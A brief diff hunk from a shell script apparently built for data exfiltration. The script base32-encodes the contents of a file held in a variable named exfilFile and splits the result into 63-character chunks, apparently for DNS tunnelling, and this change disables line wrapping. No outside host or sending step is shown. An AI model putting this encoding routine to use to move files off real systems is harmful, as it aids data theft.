@@ -83,7 +83,7 @@ fi
 
 #Convert data to base32, space into 63-character chunks, delimit on spaces
 #The base32 program might not be included, might want to write base32 encoding into here
-data="$(cat $exfilFile | base32)"
+data="$(cat $exfilFile | base32 --wrap=0)"
 data="$(echo $data | sed -r 's/(.{63})/\1 /g')"
 data="$(echo $data| tr = ' ')"
 
